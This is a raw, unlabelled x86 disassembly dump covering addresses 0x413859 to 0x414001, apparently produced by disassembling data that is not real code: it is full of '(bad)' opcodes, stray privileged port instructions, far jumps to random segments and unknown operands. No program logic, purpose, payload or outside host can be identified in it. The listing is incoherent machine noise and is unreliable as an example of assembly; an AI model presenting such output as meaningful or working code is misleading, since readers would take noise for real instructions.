  413859:	mov    DWORD PTR [edi-0xd],esp
  41385c:	jg     0x4138d4
  41385e:	(bad)  
  413860:	pop    esi
  413861:	inc    ebx
  413862:	test   al,0xd4
  413864:	daa    
  413865:	jno    0x413891
  413867:	and    eax,0xa6606073
  41386c:	jl     0x413875
  41386e:	sbb    esi,DWORD PTR [edx]
  413870:	bound  edx,QWORD PTR [eax-0x3b4db819]
  413876:	pop    eax
  413877:	add    edi,eax
  413879:	loopne 0x413814
  41387b:	dec    ebp
  41387c:	mov    BYTE PTR [edx-0x59275e7f],cl
  413882:	fadd   QWORD PTR [ebx]
  413884:	sbb    DWORD PTR [ecx+ebx*2],eax
  413887:	nop
  413888:	pop    esi
  413889:	jmp    0x4138be
  41388b:	push   edx
  41388c:	data16 in al,0xb4
  41388f:	cmp    DWORD PTR [edx+0x59],0xffffff88
  413893:	dec    eax
  413894:	nop
  413895:	jno    0x4138c1
  413897:	xor    DWORD PTR [edx+0x539398eb],0x9ededa50
  4138a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138a2:	mov    WORD PTR [esi-0x3c],?
  4138a5:	enter  0xa160,0xba
  4138a9:	push   es
  4138aa:	in     eax,0x29
  4138ac:	mov    al,ds:0x5ec89ee5
  4138b1:	mov    DWORD PTR ds:[eax],ebx
  4138b4:	pop    esp
  4138b5:	outs   dx,BYTE PTR ds:[esi]
  4138b6:	mov    dl,0xd8
  4138b8:	push   ecx
  4138b9:	popa   
  4138ba:	xor    eax,DWORD PTR [ebx]
  4138bc:	add    al,0x4
  4138be:	stos   DWORD PTR es:[edi],eax
  4138bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138c0:	xor    edx,esi
  4138c2:	out    dx,al
  4138c3:	cmp    BYTE PTR [ebx],bh
  4138c5:	dec    eax
  4138c6:	shr    esi,1
  4138c8:	push   ss
  4138c9:	sbb    DWORD PTR [ecx+eiz*4+0x5b],ecx
  4138cd:	aaa    
  4138ce:	dec    ebp
  4138cf:	clc    
  4138d0:	or     ebp,0xd95e45f0
  4138d6:	test   DWORD PTR [ebx+0x72],ecx
  4138d9:	dec    ecx
  4138da:	add    ebp,0x22
  4138dd:	pop    edi
  4138de:	pop    ds
  4138df:	inc    edx
  4138e0:	push   ss
  4138e1:	mov    eax,0x197e2a74
  4138e6:	icebp  
  4138e7:	dec    esi
  4138e8:	pop    esi
  4138e9:	hlt    
  4138ea:	pop    es
  4138eb:	jle    0x4138ec
  4138ed:	stc    
  4138ee:	mov    eax,ds:0xb560c629
  4138f3:	scas   al,BYTE PTR es:[edi]
  4138f4:	cmp    BYTE PTR [ebx+0x6e1d5bbc],dl
  4138fa:	loopne 0x4138b9
  4138fc:	pop    edi
  4138fd:	int    0xe6
  4138ff:	ret    0x50f
  413902:	stc    
  413903:	xor    BYTE PTR [edx+0x31],bh
  413906:	test   al,0x8e
  413908:	cmp    BYTE PTR [eax],dl
  41390a:	inc    esi
  41390b:	in     eax,0x9c
  41390d:	dec    esp
  41390e:	inc    esp
  41390f:	aas    
  413910:	fidiv  WORD PTR [ecx-0x20]
  413913:	ret    
  413914:	mov    ch,0x42
  413916:	adc    DWORD PTR [edx],eax
  413918:	repz mov al,ds:0x141fc188
  41391e:	or     ch,BYTE PTR [ebp+0x31]
  413921:	lds    esp,FWORD PTR gs:[eax]
  413924:	rcr    esi,1
  413926:	sbb    cl,BYTE PTR [edx]
  413928:	push   eax
  413929:	sbb    al,0xbc
  41392b:	mov    eax,ds:0xadb73b28
  413930:	and    esi,DWORD PTR [eax-0x1c]
  413933:	ins    BYTE PTR es:[edi],dx
  413934:	cmp    DWORD PTR [ebx],esp
  413936:	out    dx,al
  413937:	in     al,dx
  413938:	sahf   
  413939:	jp     0x4138c6
  41393b:	hlt    
  41393c:	dec    ecx
  41393d:	(bad)  
  41393f:	mov    al,ds:0x2c8c809d
  413944:	jecxz  0x41391a
  413946:	int3   
  413947:	ja     0x4139a7
  413949:	xor    ecx,DWORD PTR [eax-0x73]
  41394c:	mov    eax,0xb9a879d7
  413951:	xor    ah,ah
  413953:	mov    al,ds:0xe766ebe0
  413958:	(bad)  
  413959:	push   edx
  41395a:	mul    DWORD PTR [edx+0x5e]
  41395d:	mov    ah,0x3e
  41395f:	mul    dl
  413961:	add    BYTE PTR [eax],bl
  413963:	adc    eax,0x2dcf6135
  413968:	and    DWORD PTR [edx-0x6abccb75],ebp
  41396e:	out    0x8d,eax
  413970:	and    edx,0x53
  413973:	stc    
  413974:	out    dx,al
  413975:	sbb    dh,BYTE PTR [edx-0x6e]
  413978:	enter  0x1572,0xb9
  41397c:	and    BYTE PTR [ecx+0xe],ah
  41397f:	loope  0x4139a2
  413981:	(bad)  
  413982:	or     ah,ah
  413984:	pop    esi
  413985:	mov    dh,cl
  413987:	jle    0x413a06
  413989:	clc    
  41398a:	clc    
  41398b:	shl    DWORD PTR [eax+eiz*2-0x7cf8c246],cl
  413992:	popa   
  413993:	enter  0xf140,0xee
  413997:	push   esi
  413998:	mov    es,esp
  41399a:	xchg   esp,eax
  41399b:	mov    ebp,0xa0e68d49
  4139a0:	in     eax,dx
  4139a1:	jno    0x4139b9
  4139a3:	hlt    
  4139a4:	pop    ebp
  4139a5:	test   al,0x98
  4139a7:	xchg   esp,eax
  4139a8:	pop    esi
  4139a9:	fnstsw WORD PTR [edx-0x41b082f0]
  4139af:	aad    0xff
  4139b1:	and    al,0xe9
  4139b3:	lods   al,BYTE PTR ds:[esi]
  4139b4:	outs   dx,DWORD PTR ds:[esi]
  4139b5:	jno    0x413a25
  4139b7:	mov    bh,BYTE PTR [ebx+ecx*2+0x5d]
  4139bb:	ret    0x9186
  4139be:	out    0x47,eax
  4139c0:	mov    eax,0x9ee57664
  4139c5:	xchg   ebx,eax
  4139c6:	mov    edi,0x18611975
  4139cb:	mov    eax,DWORD PTR [eax]
  4139cd:	out    dx,eax
  4139ce:	pop    ds
  4139cf:	push   ecx
  4139d0:	fisttp WORD PTR [ebx+ebp*8+0x26]
  4139d4:	out    0xa8,eax
  4139d6:	sub    BYTE PTR [ecx+0x6e],bh
  4139d9:	call   0x613e51c4
  4139de:	ins    BYTE PTR es:[edi],dx
  4139df:	cwde   
  4139e0:	sbb    DWORD PTR [esi-0x20],0xf0824e45
  4139e7:	retf   
  4139e8:	fadd   QWORD PTR [ebx-0x51]
  4139eb:	inc    eax
  4139ec:	push   es
  4139ed:	mov    ds:0x60fc4c59,eax
  4139f2:	test   eax,0x626808c8
  4139f7:	sub    BYTE PTR [edi+edx*8+0x11ef99ee],al
  4139fe:	sbb    esp,ebx
  413a00:	adc    BYTE PTR [ebx],al
  413a02:	dec    edi
  413a03:	mov    al,ds:0xab32a15a
  413a08:	sahf   
  413a09:	adc    ecx,DWORD PTR [esi-0xcd64d3e]
  413a0f:	add    BYTE PTR [edx-0x7d],cl
  413a12:	je     0x4139ea
  413a14:	ficomp WORD PTR [eax-0x43f21be2]
  413a1a:	out    dx,al
  413a1b:	xor    DWORD PTR [eax+0x4a],ebp
  413a1e:	psadbw mm7,mm0
  413a21:	mov    al,0xc5
  413a23:	mov    al,ds:0xfd62983d
  413a28:	es xchg esi,eax
  413a2a:	xlat   BYTE PTR ds:[ebx]
  413a2b:	int3   
  413a2c:	xor    dl,BYTE PTR [edi+edi*1+0x78614b2e]
  413a33:	push   edi
  413a34:	int    0x76
  413a36:	repz or ah,bh
  413a39:	pusha  
  413a3a:	mov    ebx,0xaff13117
  413a3f:	in     eax,dx
  413a40:	pop    esp
  413a41:	(bad)  
  413a42:	out    dx,al
  413a43:	add    BYTE PTR [edx],bh
  413a45:	fst    QWORD PTR [esi+ecx*8+0x7d04a863]
  413a4c:	repnz fs jmp 0xb68d:0xa4c35b2d
  413a55:	mov    al,0x51
  413a57:	jno    0x413a29
  413a59:	shr    esi,cl
  413a5b:	loop   0x413a34
  413a5d:	test   cl,dh
  413a5f:	test   al,0x15
  413a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a62:	sub    DWORD PTR [ebx+edi*8-0xdb70561],esp
  413a69:	inc    ecx
  413a6a:	sub    DWORD PTR ss:[eax-0x1d],ecx
  413a6e:	out    dx,al
  413a6f:	push   edx
  413a70:	jmp    0xf8e6:0x26a45f93
  413a77:	mov    al,ds:0x9998addf
  413a7c:	imul   edi,edx,0x1c
  413a7f:	mov    BYTE PTR [esi-0x2e],bl
  413a82:	es out dx,eax
  413a84:	clc    
  413a85:	hlt    
  413a86:	adc    BYTE PTR [eax],al
  413a88:	cmp    eax,0x70588e61
  413a8d:	out    0x8f,al
  413a8f:	xchg   BYTE PTR [eax],ch
  413a91:	shr    esi,0xfa
  413a94:	popa   
  413a95:	test   DWORD PTR es:[edx+0x66],ecx
  413a99:	mov    DWORD PTR [ebx+0x6a60c6ea],ebp
  413a9f:	stos   BYTE PTR es:[edi],al
  413aa0:	mov    ds:0x22922d45,al
  413aa5:	fist   DWORD PTR [eax+0x4c]
  413aa8:	pop    esi
  413aa9:	push   ebp
  413aaa:	lods   eax,DWORD PTR ds:[esi]
  413aab:	mov    edi,0x3f2bdc04
  413ab0:	mov    esp,0x47a7af42
  413ab5:	popa   
  413ab6:	cmp    BYTE PTR [edi+ebx*8+0x3e],bh
  413aba:	cmp    ch,BYTE PTR [ecx-0x2d5776a2]
  413ac0:	loopne 0x413a6c
  413ac2:	fild   DWORD PTR fs:[ecx]
  413ac5:	inc    ebx
  413ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ac7:	outs   dx,BYTE PTR ds:[esi]
  413ac8:	fwait
  413ac9:	and    bl,ch
  413acb:	mov    eax,ds:0xa01971b5
  413ad0:	add    BYTE PTR [edi-0x26],0x2f
  413ad4:	pop    ebp
  413ad5:	jbe    0x413a8f
  413ad7:	lods   al,BYTE PTR ds:[esi]
  413ad8:	ds adc dl,cl
  413adb:	std    
  413adc:	xchg   esi,eax
  413add:	mov    edx,0x84dfa199
  413ae2:	xchg   esi,eax
  413ae3:	sub    eax,0x9ff046d3
  413ae8:	pop    esi
  413ae9:	test   eax,0x3ed77b7b
  413aee:	cld    
  413aef:	xchg   BYTE PTR [ebx+0x15],al
  413af2:	retf   
  413af3:	push   ecx
  413af4:	pop    ebx
  413af5:	dec    edx
  413af6:	mov    dh,0x62
  413af8:	shl    BYTE PTR [eax-0x47a7562b],cl
  413afe:	out    dx,al
  413aff:	jae    0x51234588
  413b05:	jp     0x413a98
  413b07:	outs   dx,DWORD PTR ds:[esi]
  413b08:	frstor [eax-0x37]
  413b0b:	out    0xc3,eax
  413b0d:	mov    esi,0x307ffaa6
  413b12:	out    dx,al
  413b13:	ds (bad) 
  413b16:	mov    dl,BYTE PTR [edi-0x5e72e31d]
  413b1c:	sub    al,0x6e
  413b1e:	je     0x413b7a
  413b20:	mov    ecx,DWORD PTR [eax-0x6aa16292]
  413b26:	sub    DWORD PTR [edi],edi
  413b28:	jmp    0x413afd
  413b2a:	data16 jge 0x413ab6
  413b2d:	pusha  
  413b2e:	dec    BYTE PTR [edi+ebx*4+0x75e24fa]
  413b35:	cs pop esi
  413b37:	test   DWORD PTR [esi+0x19],ebx
  413b3a:	fst    DWORD PTR [esi+0x58]
  413b3d:	jo     0x413bba
  413b3f:	and    ah,BYTE PTR [edx+0x61]
  413b42:	std    
  413b43:	or     BYTE PTR [esi],bl
  413b45:	pop    es
  413b46:	cdq    
  413b47:	jecxz  0x413b79
  413b49:	dec    esp
  413b4a:	jmp    0xde7e:0xaaee6120
  413b51:	cld    
  413b52:	ret    
  413b53:	pop    es
  413b54:	fbld   TBYTE PTR [eax+0x4]
  413b57:	xchg   edx,eax
  413b58:	dec    edx
  413b59:	in     eax,0x1f
  413b5b:	aaa    
  413b5c:	sub    ebx,DWORD PTR [eax]
  413b5e:	and    edx,DWORD PTR [esi-0x4db331d7]
  413b64:	arpl   WORD PTR [ebp-0x47],ax
  413b67:	add    BYTE PTR [edx+esi*4+0x681aff58],bh
  413b6e:	jne    0x413bb3
  413b70:	pop    esi
  413b71:	or     bl,BYTE PTR [esi-0x7277cb93]
  413b77:	pop    ds
  413b78:	pop    esi
  413b79:	pop    es
  413b7a:	sub    eax,DWORD PTR [ecx]
  413b7c:	cdq    
  413b7d:	loopne 0x413b9b
  413b7f:	popf   
  413b80:	jge    0x413be2
  413b82:	xor    DWORD PTR [edx-0x75881e51],edi
  413b88:	jmp    0x413b76
  413b8a:	out    dx,al
  413b8b:	push   edi
  413b8c:	mov    bh,0x51
  413b8e:	add    BYTE PTR ds:0x6120c316,bh
  413b94:	(bad)  
  413b95:	into   
  413b96:	adc    DWORD PTR [ebp+0x30ebb9bb],edx
  413b9c:	out    dx,eax
  413b9d:	repz idiv BYTE PTR [ecx+0x12]
  413ba1:	add    DWORD PTR [edi-0x299ef185],esi
  413ba7:	jl     0x413b6f
  413ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413baa:	fidiv  WORD PTR [ecx]
  413bac:	fadd   DWORD PTR [ebp-0x12]
  413baf:	xchg   ah,dl
  413bb1:	je     0x413be1
  413bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bb4:	inc    ebx
  413bb5:	push   ds
  413bb6:	pop    es
  413bb7:	mov    eax,ds:0x348c21f6
  413bbc:	xor    al,0x58
  413bbe:	imul   edi,ebp,0x5e
  413bc1:	dec    ebp
  413bc2:	mov    ?,eax
  413bc4:	pop    es
  413bc5:	fmul   st,st(0)
  413bc7:	leave  
  413bc8:	inc    edi
  413bc9:	popa   
  413bca:	das    
  413bcb:	mov    BYTE PTR [ebp+0x3c59883],ch
  413bd1:	dec    edx
  413bd2:	jmp    0xdf5c:0x1e28341a
  413bd9:	mov    al,0x2b
  413bdb:	jns    0x413b7f
  413bdd:	mov    al,ds:0x7492b93c
  413be2:	das    
  413be3:	mov    eax,ds:0x32c32424
  413be8:	jbe    0x413c69
  413bea:	imul   esp,esp,0x5b
  413bed:	fimul  DWORD PTR [edx-0x36]
  413bf0:	dec    ebx
  413bf1:	mov    esi,0xa1496b9e
  413bf6:	frstor [eax+0x72dfc76f]
  413bfc:	imul   ecx,DWORD PTR [esi+0x795e48d4],0x7f
  413c03:	inc    ebx
  413c04:	inc    ecx
  413c05:	jg     0x413c0b
  413c07:	mov    ch,0xeb
  413c09:	pusha  
  413c0a:	sbb    esi,DWORD PTR fs:[edi]
  413c0d:	ss aad 0x9f
  413c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c11:	dec    ebp
  413c12:	(bad)  
  413c13:	fidivr DWORD PTR [esi-0x3078d1f8]
  413c19:	jge    0x413bcc
  413c1b:	in     al,dx
  413c1c:	lds    ebx,FWORD PTR [ecx-0x4e]
  413c1f:	ja     0x413c11
  413c21:	mov    cl,0xc8
  413c23:	and    BYTE PTR [ebp+0x5ec275a7],dh
  413c29:	sti    
  413c2a:	test   edx,0x185f1343
  413c30:	shl    DWORD PTR [eax-0x72],cl
  413c33:	pop    ds
  413c34:	jmp    0x413c3c
  413c36:	inc    esp
  413c37:	sbb    ecx,ecx
  413c39:	dec    esp
  413c3a:	out    dx,al
  413c3b:	fisubr DWORD PTR [edi-0x89170de]
  413c41:	ins    BYTE PTR es:[edi],dx
  413c42:	hlt    
  413c43:	mov    al,ds:0xfd5d21bf
  413c48:	sbb    esp,DWORD PTR [edx-0x6d]
  413c4b:	dec    ebp
  413c4c:	ins    BYTE PTR es:[edi],dx
  413c4d:	pop    ss
  413c4e:	out    dx,al
  413c4f:	pusha  
  413c50:	in     al,0xd7
  413c52:	sbb    BYTE PTR [esi+0x68],ch
  413c55:	push   bx
  413c57:	mov    eax,ds:0x5d83b069
  413c5c:	adc    al,0xa
  413c5e:	sub    al,0x98
  413c60:	pop    ecx
  413c61:	call   0xbdb0793
  413c66:	sub    eax,0x3aff3627
  413c6b:	addr16 push cs
  413c6d:	popa   
  413c6e:	int3   
  413c6f:	stos   DWORD PTR es:[di],eax
  413c71:	(bad)  
  413c73:	and    bl,BYTE PTR [esi+0x75cfeead]
  413c79:	sub    ebp,DWORD PTR [edx]
  413c7b:	sbb    al,0x54
  413c7d:	cli    
  413c7e:	and    al,0xa1
  413c80:	icebp  
  413c81:	and    eax,0x492a56aa
  413c86:	or     ecx,DWORD PTR [ebx]
  413c88:	pop    esi
  413c89:	sub    eax,0x8d9174bd
  413c8e:	ret    0x2749
  413c91:	popa   
  413c92:	pop    ds
  413c93:	div    DWORD PTR [ebx-0x5a5ad904]
  413c99:	hlt    
  413c9a:	or     cl,BYTE PTR [eax+esi*1]
  413c9d:	add    ebp,esi
  413c9f:	sub    al,0x72
  413ca1:	mov    al,bl
  413ca3:	mov    eax,0xfb3d5321
  413ca8:	fdivr  QWORD PTR [ecx+0x2d98bee]
  413cae:	or     eax,0xae0b5e33
  413cb3:	je     0x413cef
  413cb5:	sbb    al,BYTE PTR [edx+ecx*1]
  413cb8:	sbb    BYTE PTR [ebp+0x5f],0x5
  413cbc:	xor    ebx,edx
  413cbe:	in     eax,dx
  413cbf:	(bad)  
  413cc1:	adc    dh,bh
  413cc3:	lahf   
  413cc4:	cmp    eax,0x6472ed76
  413cc9:	mov    WORD PTR [eax-0x6b],cs
  413ccc:	inc    edx
  413ccd:	lds    ebx,FWORD PTR [esi+0x10]
  413cd0:	into   
  413cd1:	push   edi
  413cd2:	jmp    0x6f2d7361
  413cd7:	ds lahf 
  413cd9:	ds add eax,0x72335e4c
  413cdf:	mov    edx,0x222708d5
  413ce4:	aaa    
  413ce5:	add    eax,0xd35eec8e
  413cea:	add    bh,al
  413cec:	pop    edi
  413ced:	fist   DWORD PTR [edi-0x2647a293]
  413cf3:	jecxz  0x413cfe
  413cf5:	sbb    DWORD PTR [ecx],edi
  413cf7:	test   esi,edi
  413cf9:	push   ds
  413cfa:	sahf   
  413cfb:	mov    eax,ds:0xe6d29d4f
  413d00:	fsubp  st(1),st
  413d02:	test   cl,dh
  413d04:	pop    ecx
  413d05:	pop    edi
  413d06:	mov    edx,0x2ece69aa
  413d0b:	push   edx
  413d0c:	pop    ebp
  413d0d:	adc    BYTE PTR ds:0xb781f79f,bl
  413d13:	fcomp  QWORD PTR [esi-0x3d]
  413d16:	popf   
  413d17:	mov    ch,0xc9
  413d19:	in     al,dx
  413d1a:	out    dx,eax
  413d1b:	mov    bl,0x9a
  413d1d:	ret    
  413d1e:	in     al,0x1e
  413d20:	inc    ebp
  413d21:	loope  0x413ce7
  413d23:	cld    
  413d24:	mov    bl,0xe2
  413d26:	ja     0x413d16
  413d28:	cmp    DWORD PTR [ecx-0x21],esp
  413d2b:	fsub   QWORD PTR [edi-0x29]
  413d2e:	aad    0xde
  413d30:	in     al,0xb4
  413d32:	out    0xd9,eax
  413d34:	ret    
  413d35:	push   esp
  413d36:	sub    eax,esp
  413d38:	pop    esi
  413d39:	xor    eax,0x608e0232
  413d3e:	hlt    
  413d3f:	pop    ebx
  413d40:	outs   dx,DWORD PTR ds:[esi]
  413d41:	adc    al,0x40
  413d43:	test   DWORD PTR [ebp+0x7e],ecx
  413d46:	lock dec edi
  413d48:	aam    0xd1
  413d4a:	mov    bh,0x40
  413d4c:	jle    0x413d49
  413d4e:	xchg   ecx,eax
  413d4f:	mov    ecx,0x31105df8
  413d54:	stos   BYTE PTR es:[edi],al
  413d55:	shl    cl,cl
  413d57:	mov    edx,0xcb0775de
  413d5c:	xor    DWORD PTR [ecx],ebp
  413d5e:	jno    0x413cfc
  413d60:	adc    DWORD PTR [esi-0x18],0x6ec5f025
  413d67:	or     DWORD PTR [edi-0x5e],ebp
  413d6a:	sub    ah,BYTE PTR [ebx-0x634461bc]
  413d70:	or     BYTE PTR [ecx],dh
  413d72:	dec    esi
  413d73:	iret   
  413d74:	push   ss
  413d75:	dec    ebx
  413d76:	and    BYTE PTR [ecx],dl
  413d78:	pop    es
  413d79:	bound  esi,QWORD PTR [ecx+eiz*4]
  413d7c:	jb     0x413d8c
  413d7e:	call   0x6ab7a909
  413d83:	mov    eax,ds:0xc0fa7beb
  413d88:	add    dh,BYTE PTR [edx+ecx*4-0x21fa173]
  413d8f:	call   0x6155:0x66bdb79a
  413d96:	outs   dx,BYTE PTR ds:[esi]
  413d97:	jns    0x413d26
  413d99:	(bad)  
  413d9a:	int3   
  413d9b:	and    ecx,DWORD PTR [edx]
  413d9d:	daa    
  413d9e:	out    dx,eax
  413d9f:	xor    eax,0x7f2dbaa7
  413da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413da5:	mov    WORD PTR [ebx-0x5f],?
  413da8:	mov    ah,0x86
  413daa:	out    dx,eax
  413dab:	mov    ch,0x11
  413dad:	repnz add eax,0xf1ecea1
  413db3:	inc    esp
  413db4:	mov    eax,ds:0x36434972
  413db9:	retf   
  413dba:	pop    edx
  413dbb:	and    DWORD PTR [esi+0x66],eax
  413dbe:	jnp    0x413dc6
  413dc0:	push   edx
  413dc1:	(bad)  
  413dc2:	pushf  
  413dc3:	(bad)  
  413dc4:	jmp    0x413e36
  413dc6:	or     al,0x21
  413dc8:	pop    ss
  413dc9:	mov    esi,0x3b0b7e68
  413dce:	adc    dl,ah
  413dd0:	adc    eax,0xe5dcee77
  413dd5:	arpl   WORD PTR [esi+0x51],bx
  413dd8:	add    BYTE PTR [ebp+0x8],al
  413ddb:	adc    ch,0x3c
  413dde:	ret    0xd0a3
  413de1:	cli    
  413de2:	jae    0x413d76
  413de4:	lahf   
  413de5:	cmp    ecx,DWORD PTR [edx+0x483a0661]
  413deb:	(bad)  
  413dec:	gs out 0xd8,al
  413def:	push   0xffffff82
  413df1:	pusha  
  413df2:	xor    al,ah
  413df4:	inc    ecx
  413df5:	mov    bh,0x4e
  413df7:	mov    eax,ds:0xdec41efa
  413dfc:	inc    eax
  413dfd:	int    0x75
  413dff:	sti    
  413e00:	pop    esi
  413e01:	sub    eax,0x1fb4138a
  413e06:	sbb    DWORD PTR [ebp+0x59],edx
  413e09:	pusha  
  413e0a:	test   BYTE PTR [ebx+0x75],cl
  413e0d:	call   0x814e7afc
  413e12:	adc    al,0xb9
  413e14:	push   ecx
  413e15:	sub    BYTE PTR [ebp+esi*1+0x946f29e],dh
  413e1c:	add    cl,BYTE PTR [ebx-0x2]
  413e1f:	mov    al,ds:0x81e44e32
  413e24:	call   0x8d16:0x5ebf6508
  413e2b:	iret   
  413e2c:	xchg   esi,eax
  413e2d:	mov    ds:0x6094df5a,al
  413e32:	and    bl,BYTE PTR [esi+0x5fb6d472]
  413e38:	in     eax,dx
  413e39:	in     eax,dx
  413e3a:	out    dx,al
  413e3b:	mov    WORD PTR [edx+0x7dfcce25],?
  413e41:	aaa    
  413e42:	mov    ebx,0xe43cf1a0
  413e47:	mov    cs,WORD PTR [ecx+0x5e6eb4e1]
  413e4d:	add    eax,0xc5ea28c3
  413e52:	(bad)  
  413e54:	sbb    eax,0xa3f21160
  413e59:	pop    edi
  413e5a:	xchg   esi,eax
  413e5b:	test   al,0xb5
  413e5d:	mov    WORD PTR [ebp-0x51f7a1d2],?
  413e63:	jmp    0x1d59d90a
  413e68:	add    bl,BYTE PTR [esi+0x9]
  413e6b:	inc    ebp
  413e6c:	jp     0x413e26
  413e6e:	push   cs
  413e6f:	cld    
  413e70:	(bad)  
  413e71:	addr16 ss pop edi
  413e74:	shr    BYTE PTR [eax-0x10],1
  413e77:	jb     0x413e75
  413e79:	and    ecx,DWORD PTR [esi+0x28]
  413e7c:	pop    edx
  413e7d:	hlt    
  413e7e:	jle    0x413e23
  413e80:	add    eax,0xdea1125c
  413e85:	fstp   TBYTE PTR [edi+esi*8]
  413e88:	jmp    0xee52:0xae90a770
  413e8f:	adc    edi,DWORD PTR [ebp+0x180fe3f5]
  413e95:	hlt    
  413e96:	mov    ds:0x9e604e09,eax
  413e9b:	pop    ebp
  413e9c:	mov    bh,BYTE PTR [edi+0xc]
  413e9f:	push   esp
  413ea0:	lea    eax,ds:[eax+eax*2-0x6e5d4da2]
  413ea8:	mov    ?,WORD PTR [eax-0x57]
  413eab:	pop    edx
  413eac:	fcomp  QWORD PTR [esi+0x2f]
  413eaf:	icebp  
  413eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413eb1:	rcl    BYTE PTR [ebp+ecx*2+0x7e],cl
  413eb5:	int    0xc5
  413eb7:	inc    ecx
  413eb8:	pop    esi
  413eb9:	fwait
  413eba:	mov    cl,0x78
  413ebc:	scas   al,BYTE PTR es:[edi]
  413ebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ebe:	pop    esp
  413ebf:	add    BYTE PTR [ebp-0x36],dl
  413ec2:	cmp    WORD PTR [ecx+edx*4-0x3d],sp
  413ec7:	cwde   
  413ec8:	(bad)  
  413ec9:	(bad)  
  413eca:	out    dx,al
  413ecb:	mov    ebp,0xada03b10
  413ed0:	sbb    eax,DWORD PTR [ebp+0x75]
  413ed3:	clc    
  413ed4:	aad    0x60
  413ed6:	loope  0x413f0c
  413ed8:	mov    esp,0x5e7a4a0d
  413edd:	sbb    DWORD PTR [eax],edi
  413edf:	xchg   esp,eax
  413ee0:	ins    DWORD PTR es:[edi],dx
  413ee1:	sbb    edi,DWORD PTR [ecx]
  413ee3:	sub    ebp,DWORD PTR [esi+ebx*2+0x482d4050]
  413eea:	fstp   QWORD PTR [ebx]
  413eec:	xchg   ebx,eax
  413eed:	mov    al,ds:0x5a38e436
  413ef2:	mov    edi,0x7737d90
  413ef7:	jbe    0x413ede
  413ef9:	loopne 0x413ecc
  413efb:	in     al,0xe6
  413efd:	stc    
  413efe:	out    dx,al
  413eff:	inc    ebx
  413f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f01:	popa   
  413f02:	pop    ecx
  413f03:	out    0xf6,eax
  413f05:	fild   QWORD PTR [edi+ebx*2+0x65]
  413f0a:	sahf   
  413f0b:	cdq    
  413f0c:	pop    esi
  413f0d:	jge    0x413ea4
  413f0f:	jecxz  0x413ef3
  413f11:	dec    ebx
  413f12:	xchg   BYTE PTR [esi+0x608c5f5e],bl
  413f18:	outs   dx,DWORD PTR ds:[esi]
  413f19:	adc    ch,al
  413f1b:	mov    al,BYTE PTR [edx+0x64]
  413f1e:	xchg   esp,eax
  413f1f:	leave  
  413f20:	push   ebx
  413f21:	jno    0x413fa2
  413f23:	add    ax,0xdc95
  413f27:	pusha  
  413f28:	lods   eax,DWORD PTR ds:[esi]
  413f29:	sti    
  413f2a:	sub    al,0xa2
  413f2c:	pop    esi
  413f2d:	sub    ebp,DWORD PTR [ebx]
  413f2f:	pop    ebx
  413f30:	push   ebp
  413f31:	sbb    edi,DWORD PTR [ebx+0x2060d1a9]
  413f37:	xor    BYTE PTR [eax+ebp*8+0x1d],dh
  413f3b:	sbb    DWORD PTR [esi+eiz*1-0x12],ebp
  413f3f:	lds    ebp,FWORD PTR [ebp+0x7fe46d24]
  413f45:	jo     0x413f9d
  413f47:	(bad)  
  413f48:	fild   WORD PTR [ebp+0x2c]
  413f4b:	and    edi,ebp
  413f4d:	int    0x88
  413f4f:	das    
  413f50:	ror    DWORD PTR [edx-0x12],cl
  413f53:	out    0xcb,al
  413f55:	fisttp DWORD PTR [ebp+0x6b]
  413f58:	icebp  
  413f59:	add    DWORD PTR [ebp-0x5f],0x66e3d5de
  413f60:	into   
  413f61:	jge    0x413f49
  413f63:	stos   DWORD PTR es:[edi],eax
  413f64:	pop    esi
  413f65:	aad    0xad
  413f67:	add    al,0x50
  413f69:	push   ss
  413f6a:	out    0x68,eax
  413f6c:	ins    DWORD PTR es:[edi],dx
  413f6d:	pop    ecx
  413f6e:	xchg   BYTE PTR [edi],dl
  413f70:	pop    ebp
  413f71:	fbld   TBYTE PTR [edx]
  413f73:	fs leave 
  413f75:	(bad)  
  413f76:	xchg   esi,eax
  413f77:	add    al,BYTE PTR [ebx+0x43baed0b]
  413f7d:	sti    
  413f7e:	add    ah,ah
  413f80:	addr16 mov esp,0xa47279de
  413f86:	or     DWORD PTR [edi+0x6f873a85],ebx
  413f8c:	pop    esi
  413f8d:	imul   esi,DWORD PTR [eax-0x25],0x6b
  413f91:	xor    ch,dh
  413f93:	jle    0x413fcc
  413f95:	retf   0x54d4
  413f98:	mov    ds:0x3fa2565f,al
  413f9d:	sub    edi,DWORD PTR [eax+0x1ad4d5cc]
  413fa3:	jns    0x413f56
  413fa5:	popf   
  413fa6:	data16 jbe 0x414008
  413fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413faa:	mov    edi,DWORD PTR [esi-0x57]
  413fad:	mov    esi,0xb6c04470
  413fb2:	test   eax,ebx
  413fb4:	std    
  413fb5:	aaa    
  413fb6:	pop    edx
  413fb7:	mov    ebx,0xec6977ae
  413fbc:	icebp  
  413fbd:	pusha  
  413fbe:	stc    
  413fbf:	fnsave ds:0xcad22903
  413fc5:	pop    edi
  413fc6:	out    dx,al
  413fc7:	xchg   eax,ebp
  413fc9:	mov    ds:0x14b71a20,eax
  413fce:	frstor [ecx-0x69ae433c]
  413fd4:	dec    ebp
  413fd5:	cmp    DWORD PTR [ecx-0x113e4eb8],esi
  413fdb:	xor    ebp,DWORD PTR [ebx-0x55b05602]
  413fe1:	jl     0x413fcf
  413fe3:	call   0xe30bc6c
  413fe8:	mov    BYTE PTR [ebp-0x20],bl
  413feb:	add    DWORD PTR [ebx+0xf],edx
  413fee:	ss inc esi
  413ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ff1:	fucomi st,st(6)
  413ff3:	imul   BYTE PTR ds:0x7bb501dd
  413ff9:	or     dh,BYTE PTR [ebp+ecx*4+0x17]
  413ffd:	ss pushf 
  413fff:	loope  0x413fb0
  414001:	pop    ds
